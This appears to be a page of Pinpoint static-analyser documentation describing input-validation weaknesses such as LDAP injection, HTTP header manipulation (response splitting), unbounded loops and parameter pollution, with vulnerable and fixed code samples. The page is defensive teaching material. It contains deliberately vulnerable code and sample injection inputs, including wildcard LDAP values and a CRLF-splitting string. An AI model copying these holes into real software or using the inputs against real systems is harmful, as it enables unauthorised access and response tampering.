
<!DOCTYPE html>
<html lang="en">

<head>
    <link href='../../../theme/fonts/googleapis.css' rel='stylesheet' type='text/css'>
    <link href="../../../theme/stylesheet/normalize.min.css">
    <script src="../../../theme/javascript/jquery.min.js"></script>
    <script type="text/javascript" src="../../../tipuesearch_content.js"></script>
    <link rel="stylesheet" href="../../../theme/tipuesearch/css/tipuesearch.css">
    <script type="text/javascript" src="../../../theme/tipuesearch/tipuesearch_set.js"></script>
    <script type="text/javascript" src="../../../theme/tipuesearch/tipuesearch.js"></script>

        <link rel="stylesheet" type="text/css" href="../../../theme/stylesheet/style.css">

    <link rel="stylesheet" type="text/css"
          href="../../../theme/pygments/xcode.min.css">
    <link rel="stylesheet" type="text/css" href="../../../theme/font-awesome/css/font-awesome.min.css">





    <meta charset="utf-8"/>
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <meta name="HandheldFriendly" content="True"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>     <meta name="robots" content=""/>      <!-- Chrome, Firefox OS and Opera -->
    <meta name="theme-color" content="#333333">
    <!-- Windows Phone -->
    <meta name="msapplication-navbutton-color" content="#333333">
    <!-- iOS Safari -->
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Microsoft EDGE -->
    <meta name="msapplication-TileColor" content="#333333">      <meta name="author" content="Pinpoint Team"/>
    <meta name="description" content="Manual and documents for Sourcebrella Pinpoint"/> <meta property="og:site_name" content="Pinpoint Document"/>
<meta property="og:type" content="blog"/>
<meta property="og:title" content="Pinpoint Document"/>
<meta property="og:description" content="Manual and documents for Sourcebrella Pinpoint"/>
<meta property="og:locale" content="en_US"/>
<meta property="og:url" content="../../.."/>
 
    <title>Pinpoint Document &ndash; Category</title>

</head>

<body style="display: none;">

<aside>
    <div>
        <a href="../../..">
                <img src="../../../theme/img/profile.png" alt="Pinpoint Document" title="Pinpoint Document">
        </a>
        <h1><a href="../../..">Pinpoint Document</a></h1>

        <div style="padding-left: 0">
            <form action="../../../search.html" onsubmit="return validateForm(this.elements['q'].value);">
                <input id="tipue_search_input" type="text" name="q" placeholder="Input to search">
            </form>
        </div>


        <ul class="global_lang">
                    <li class="active"><a href="javascript:void(0);"
                                                                                  language-link="en">en</a>
                    </li>
                    <li><a href="javascript:void(0);"
                                                                                  language-link="zh">zh</a>
                    </li>
        </ul>

        <!--  -->

        <nav>
            <ul class="list">
                    <li>
                        <a href="../../../standard/language-independent.html">Language Independent documents</a>
                        (3)
                    </li>
                    <li>
                        <a href="../../../standard/c.html">c/c++ documents</a>
                        (317)
                    </li>
                    <li>
                        <a href="../../../standard/csharp.html">csharp documents</a>
                        (39)
                    </li>
                    <li>
                        <a href="../../../standard/golang.html">golang documents</a>
                        (34)
                    </li>
                    <li>
                        <a href="../../../standard/java.html">java documents</a>
                        (555)
                    </li>
                    <li>
                        <a href="../../../standard/javascript.html">javascript documents</a>
                        (295)
                    </li>
                    <li>
                        <a href="../../../standard/objective-c.html">objective-c documents</a>
                        (124)
                    </li>
                    <li>
                        <a href="../../../standard/python.html">python documents</a>
                        (618)
                    </li>
                    <li>
                        <a href="../../../standard/shell.html">shell documents</a>
                        (334)
                    </li>
                    <li>
                        <a href="../../../standard/swift.html">swift documents</a>
                        (26)
                    </li>

            </ul>
        </nav>

        <ul class="social">
        </ul>
    </div>


</aside>
<main>
          <article>
            <h1>
            Input validation and representation (35)
            </h1>
        </article>
        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE0082">LDAP Injection Vulnerability</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 3 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable code Example</a></li>
<li><a href="#fixed-code-example">Fixed Code Example</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>The Lightweight Directory Access Protocol (LDAP) allows an application to remotely perform operations such as searching and modifying records in directories. LDAP injection results from inadequate input sanitization and validation and allows malicious users to glean restricted information using the directory service.</p>
<p>A whitelist can be used to restrict input to a list of valid characters. Characters and character sequences that must be excluded from whitelists—including Java Naming and Directory Interface (JNDI) metacharacters and LDAP special characters—are listed in the following table.</p>
<p>Characters and Sequences to Exclude from Whitelists</p>
<table>
<thead>
<tr>
<th>Character</th>
<th>name</th>
</tr>
</thead>
<tbody>
<tr>
<td>#</td>
<td>Hash character at the beginning of the string</td>
</tr>
<tr>
<td>' and "</td>
<td>Single and double quote</td>
</tr>
<tr>
<td>( and )</td>
<td>Round braces</td>
</tr>
<tr>
<td>+ and *</td>
<td>Addition and multiplication operators</td>
</tr>
<tr>
<td>, and ;</td>
<td>Comma and semicolon</td>
</tr>
<tr>
<td>/ and \</td>
<td>Forward slash and backslash</td>
</tr>
<tr>
<td>&lt; and &gt;</td>
<td>Angle brackets</td>
</tr>
<tr>
<td>\\</td>
<td>Double slashes*</td>
</tr>
<tr>
<td>\u0000</td>
<td>Unicode NULL character</td>
</tr>
<tr>
<td>space</td>
<td>Space character at beginning or end of string</td>
</tr>
<tr>
<td>This is a character sequence.</td>
<td></td>
</tr>
</tbody>
</table>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact.  </p>
<table>
<thead>
<tr>
<th>Scope</th>
<th>Impact</th>
</tr>
</thead>
<tbody>
<tr>
<td>Confidentiality</td>
<td>Technical Impact: Execute Unauthorized Code or Commands; Read Application Data; Modify Application Data</td>
</tr>
<tr>
<td>Integrity Availability</td>
<td>An attacker could include input that changes the LDAP query which allows unintended commands or code to be executed, allows sensitive data to be read or modified or causes other unintended behavior.</td>
</tr>
</tbody>
</table>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>1 Escape all variables using the right LDAP encoding function
2 Use Frameworks that Automatically Protect from LDAP Injection
3 Additional Defenses</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Critical</p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable code Example</h3>
<p>This noncompliant code example allows a caller of the method searchRecord() to search for a record in the directory using the LDAP protocol. The string filter is used to filter the result set for those entries that match a user name and password supplied by the caller.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="c1">// String userSN = "S*"; // Invalid</span>
<span class="c1">// String userPassword = "*"; // Invalid</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">LDAPInjection</span> <span class="o">{</span>       
  <span class="kd">private</span> <span class="kt">void</span> <span class="nf">searchRecord</span><span class="o">(</span><span class="n">String</span> <span class="n">userSN</span><span class="o">,</span> <span class="n">String</span> <span class="n">userPassword</span><span class="o">)</span> 
  <span class="kd">throws</span> <span class="n">NamingException</span> <span class="o">{</span>        
    <span class="n">Hashtable</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">String</span><span class="o">&gt;</span>  <span class="n">env</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Hashtable</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">String</span><span class="o">&gt;();</span>
    <span class="n">env</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">Context</span><span class="o">.</span><span class="na">INITIAL_CONTEXT_FACTORY</span><span class="o">,</span> <span class="s">"com.sun.jndi.ldap.LdapCtxFactory"</span><span class="o">);</span>
    <span class="k">try</span> <span class="o">{</span>
      <span class="n">DirContext</span> <span class="n">dctx</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InitialDirContext</span><span class="o">(</span><span class="n">env</span><span class="o">);</span>

      <span class="n">SearchControls</span> <span class="n">sc</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SearchControls</span><span class="o">();</span>
      <span class="n">String</span><span class="o">[]</span> <span class="n">attributeFilter</span> <span class="o">=</span> <span class="o">{</span><span class="s">"cn"</span><span class="o">,</span> <span class="s">"mail"</span><span class="o">};</span>
      <span class="n">sc</span><span class="o">.</span><span class="na">setReturningAttributes</span><span class="o">(</span><span class="n">attributeFilter</span><span class="o">);</span>
      <span class="n">sc</span><span class="o">.</span><span class="na">setSearchScope</span><span class="o">(</span><span class="n">SearchControls</span><span class="o">.</span><span class="na">SUBTREE_SCOPE</span><span class="o">);</span>
      <span class="n">String</span> <span class="n">base</span> <span class="o">=</span> <span class="s">"dc=example,dc=com"</span><span class="o">;</span>

      <span class="c1">// The following resolves to (&amp;(sn=S*)(userPassword=*))     </span>
      <span class="n">String</span> <span class="n">filter</span> <span class="o">=</span> <span class="s">"(&amp;(sn="</span> <span class="o">+</span> <span class="n">userSN</span> <span class="o">+</span> <span class="s">")(userPassword="</span> <span class="o">+</span> <span class="n">userPassword</span> <span class="o">+</span> <span class="s">"))"</span><span class="o">;</span>

      <span class="n">NamingEnumeration</span><span class="o">&lt;?&gt;</span> <span class="n">results</span> <span class="o">=</span> <span class="n">dctx</span><span class="o">.</span><span class="na">search</span><span class="o">(</span><span class="n">base</span><span class="o">,</span> <span class="n">filter</span><span class="o">,</span> <span class="n">sc</span><span class="o">);</span>
      <span class="k">while</span> <span class="o">(</span><span class="n">results</span><span class="o">.</span><span class="na">hasMore</span><span class="o">())</span> <span class="o">{</span>
        <span class="n">SearchResult</span> <span class="n">sr</span> <span class="o">=</span> <span class="o">(</span><span class="n">SearchResult</span><span class="o">)</span> <span class="n">results</span><span class="o">.</span><span class="na">next</span><span class="o">();</span>
        <span class="n">Attributes</span> <span class="n">attrs</span> <span class="o">=</span> <span class="o">(</span><span class="n">Attributes</span><span class="o">)</span> <span class="n">sr</span><span class="o">.</span><span class="na">getAttributes</span><span class="o">();</span>
        <span class="n">Attribute</span> <span class="n">attr</span> <span class="o">=</span> <span class="o">(</span><span class="n">Attribute</span><span class="o">)</span> <span class="n">attrs</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"cn"</span><span class="o">);</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">attr</span><span class="o">);</span>
        <span class="n">attr</span> <span class="o">=</span> <span class="o">(</span><span class="n">Attribute</span><span class="o">)</span> <span class="n">attrs</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"mail"</span><span class="o">);</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">attr</span><span class="o">);</span>
      <span class="o">}</span>    
      <span class="n">dctx</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">NamingException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
      <span class="c1">// Forward to handler</span>
    <span class="o">}</span>
  <span class="o">}</span> 
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>When a malicious user enters specially crafted input, as outlined previously, this elementary authentication scheme fails to confine the output of the search query to the information for which the user has access privileges.</p>
<h3 id="fixed-code-example">Fixed Code Example</h3>
<p>This compliant solution uses a whitelist to sanitize user input so that the filter string contains only valid characters. In this code, userSN may contain only letters and spaces, whereas a password may contain only alphanumeric characters.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="c1">// String userSN = "Sherlock Holmes"; // Valid</span>
<span class="c1">// String userPassword = "secret2";   // Valid</span>

<span class="c1">// ... beginning of LDAPInjection.searchRecord()...</span>
<span class="n">sc</span><span class="o">.</span><span class="na">setSearchScope</span><span class="o">(</span><span class="n">SearchControls</span><span class="o">.</span><span class="na">SUBTREE_SCOPE</span><span class="o">);</span>
<span class="n">String</span> <span class="n">base</span> <span class="o">=</span> <span class="s">"dc=example,dc=com"</span><span class="o">;</span>

<span class="k">if</span> <span class="o">(!</span><span class="n">userSN</span><span class="o">.</span><span class="na">matches</span><span class="o">(</span><span class="s">"[\\w\\s]*"</span><span class="o">)</span> <span class="o">||</span> <span class="o">!</span><span class="n">userPassword</span><span class="o">.</span><span class="na">matches</span><span class="o">(</span><span class="s">"[\\w]*"</span><span class="o">))</span> <span class="o">{</span>
  <span class="k">throw</span> <span class="k">new</span> <span class="n">IllegalArgumentException</span><span class="o">(</span><span class="s">"Invalid input"</span><span class="o">);</span>
<span class="o">}</span>

<span class="n">String</span> <span class="n">filter</span> <span class="o">=</span> <span class="s">"(&amp;(sn = "</span> <span class="o">+</span> <span class="n">userSN</span> <span class="o">+</span> <span class="s">")(userPassword="</span> <span class="o">+</span> <span class="n">userPassword</span> <span class="o">+</span> <span class="s">"))"</span><span class="o">;</span>

<span class="c1">// ... remainder of LDAPInjection.searchRecord()...    </span>
</pre></div>
</td></tr></table>
<p>When a database field such as a password must include special characters, it is critical to ensure that the authentic data is stored in sanitized form in the database and also that any user input is normalized before the validation or comparison takes place. Using characters that have special meanings in JNDI and LDAP in the absence of a comprehensive normalization and whitelisting-based routine is discouraged. Special characters must be transformed to sanitized, safe values before they are added to the whitelist expression against which input will be validated. Likewise, normalization of user input should occur before the validation step.</p>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-CEW">
<p>http://cwe.mitre.org/data/definitions/116.html <a class="footnote-backref" href="#fnref-CEW" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-OWASP">
<p>https://www.owasp.org/index.php/Top_10-2017_A1-Injection <a class="footnote-backref" href="#fnref-OWASP" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/web.html">Web</a>
                <a href="../../../tag/java.html">Java</a>
                <a href="../../../tag/injection.html">Injection</a>
                <a href="../../../tag/cwe-116.html">CWE-116</a>
                <a href="../../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1106">Mail Command Injection</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>An attacker exploits weaknesses in input validation on IMAP/SMTP servers to execute commands on the server.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>Web-mail servers often sit between the Internet and the IMAP or SMTP mail server. User requests are received by the web-mail servers which then query the back-end mail server for the requested information and return this response to the user. In an IMAP/SMTP command injection attack, mail-server commands are embedded in parts of the request sent to the web-mail server. If the web-mail server fails to adequately sanitize these requests, these commands are then sent to the back-end mail server when it is queried by the web-mail server, where the commands are then executed. This attack can be especially dangerous since administrators may assume that the back-end server is protected against direct Internet access and therefore may not secure it adequately against the execution of malicious commands.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<ul>
<li>
<p>All user-controllable input should be validated and filtered for potentially unwanted characters.</p>
</li>
<li>
<p>Input should be encoded prior to use in commands to make sure command related characters are not treated as part of the command.</p>
</li>
<li>
<p>Input should be parameterized, or restricted to data sections of a command, thus removing the chance that the input will be treated as part of the command itself.</p>
</li>
</ul>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-OWASP-A1">
<p>https://www.owasp.org/index.php/Top_10-2017_A1-Injection <a class="footnote-backref" href="#fnref-OWASP-A1" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1088">Header Manipulation</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 2 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable Code Example</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Including unvalidated data in an HTTP header allows an attacker to specify the entirety of the HTTP response rendered by the browser. When an HTTP request contains unexpected CR (carriage return, also given by %0d or \r) and LF (line feed, also given by %0a or \n) characters the server may respond with an output stream that is interpreted as two different HTTP responses (instead of one). An attacker can control the second response and mount attacks such as cross-site scripting and cache poisoning attacks.</p>
<p>HTTP response splitting weaknesses may be present when:</p>
<ul>
<li>Data enters a web application through an untrusted source, most frequently an HTTP request.</li>
<li>The data is included in an HTTP response header sent to a web user without being validated for malicious characters.</li>
</ul>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>CR and LF characters in an HTTP header may give attackers control of the remaining headers and body of the response the application intends to send, as well as allowing them to create additional responses entirely under their control. </p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<ul>
<li>
<p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications.</p>
</li>
<li>
<p>Use and specify an output encoding that can be handled by the downstream component that is reading the output.</p>
</li>
<li>
<p>Make sure that the application does not decode the same input twice.</p>
</li>
</ul>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable Code Example</h3>
<p>The following code segment reads the name of the author of a weblog entry, author, from an HTTP request and sets it in a cookie header of an HTTP response.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">String</span> <span class="n">author</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="n">AUTHOR_PARAM</span><span class="o">);</span>
<span class="o">...</span>
<span class="n">Cookie</span> <span class="n">cookie</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Cookie</span><span class="o">(</span><span class="s">"author"</span><span class="o">,</span> <span class="n">author</span><span class="o">);</span>
<span class="n">cookie</span><span class="o">.</span><span class="na">setMaxAge</span><span class="o">(</span><span class="n">cookieExpiration</span><span class="o">);</span>
<span class="n">response</span><span class="o">.</span><span class="na">addCookie</span><span class="o">(</span><span class="n">cookie</span><span class="o">);</span>
</pre></div>
</td></tr></table>
<p>Assuming a string consisting of standard alpha-numeric characters, such as "Jane Smith", is submitted in the request the HTTP response including this cookie might take the following form:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4</pre></div></td><td class="code"><div class="highlight"><pre><span></span>HTTP/1.1 200 OK
...
Set-Cookie: author=Jane Smith
...
</pre></div>
</td></tr></table>
<p>However, because the value of the cookie is formed of unvalidated user input the response will only maintain this form if the value submitted for AUTHOR_PARAM does not contain any CR and LF characters. If an attacker submits a malicious string, such as</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span>Wiley Hacker\r\nHTTP/1.1 200 OK\r\n
</pre></div>
</td></tr></table>
<p>then the HTTP response would be split into two responses of the following form:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4</pre></div></td><td class="code"><div class="highlight"><pre><span></span>HTTP/1.1 200 OK
...
Set-Cookie: author=Wiley Hacker HTTP/1.1 200 OK
...
</pre></div>
</td></tr></table>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-CWE113">
<p>https://cwe.mitre.org/data/definitions/113.html <a class="footnote-backref" href="#fnref-CWE113" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-OWASP">
<p>https://www.owasp.org/index.php/Top_10-2017_A1-Injection <a class="footnote-backref" href="#fnref-OWASP" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE4003">Reliance on untrusted inputs as loop condition</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable Code Example</a></li>
<li><a href="#fixed-code-example">Fixed code example</a></li>
</ul>
</li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>The software does not properly check the input that is used for the loop condition.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>An attacker can make the software loop too much and cause the software to refuse service.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>The upper limit of the number of cycles must be specified, and it should be verified whether the data input by the user exceeds the upper limit before the data input by the user is used for the loop condition.</p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable Code Example</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kt">void</span> <span class="nf">example_fun</span><span class="p">(</span><span class="kt">int</span> <span class="n">count</span><span class="p">)</span>  <span class="c1">//count is the input data</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="n">count</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span>  <span class="c1">//Failure to check if the value of count is too large may lead to excessive software loops and software denial of service</span>
    <span class="p">{</span>
        <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">count</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="p">...</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="p">...</span>
<span class="p">}</span>
</pre></div>
</td></tr></table>
<h3 id="fixed-code-example">Fixed code example</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kt">int</span> <span class="n">MAX_COUNT</span> <span class="o">=</span> <span class="mi">1000</span><span class="p">;</span>  <span class="c1">//In this example, the maximum number of cycles defined is 1000.</span>
<span class="kt">void</span> <span class="nf">example_fun</span><span class="p">(</span><span class="kt">int</span> <span class="n">count</span><span class="p">)</span>  <span class="c1">//count is the input data</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="n">count</span><span class="o">&gt;</span><span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">count</span><span class="o">&lt;=</span><span class="n">MAX_COUNT</span><span class="p">)</span>  <span class="c1">//Determine if the number of loops is not greater than the maximum number of loops</span>
    <span class="p">{</span>
        <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">count</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="p">{</span> 
            <span class="p">...</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="p">...</span>
<span class="p">}</span>
</pre></div>
</td></tr></table>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/c.html">C</a>
                <a href="../../../tag/cpp.html">CPP</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1104">HTTP Parameter Pollution</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable Code Example</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>An attacker overrides or adds HTTP GET/POST parameters by injecting query string delimiters. </p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>Via HPP(HTTP Parameter Pollution) it may be possible to override existing hardcoded HTTP parameters, modify the application behaviors, access and, potentially exploit, uncontrollable variables, and bypass input validation checkpoints and WAF(Web Application Firewall) rules.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<ul>
<li>
<p>If using a Web Application Firewall (WAF), filters should be carefully configured to detect abnormal HTTP requests</p>
</li>
<li>
<p>Perform URL encoding</p>
</li>
<li>
<p>Use strict regular expressions in URL rewriting</p>
</li>
<li>
<p>Beware of multiple occurrences of a parameter in a Query String</p>
</li>
</ul>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable Code Example</h3>
<p>Suppose some code as the following: </p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kt">void</span> <span class="kd">private</span> <span class="nf">executeBackendRequest</span><span class="o">(</span><span class="n">HTTPRequest</span> <span class="n">request</span><span class="o">){</span>
    <span class="n">String</span> <span class="n">amount</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"amount"</span><span class="o">);</span>
    <span class="n">String</span> <span class="n">beneficiary</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"recipient"</span><span class="o">);</span>
    <span class="n">HttpRequest</span><span class="o">(</span><span class="s">"http://backendServer.com/servlet/actions"</span><span class="o">,</span><span class="s">"POST"</span><span class="o">,</span>
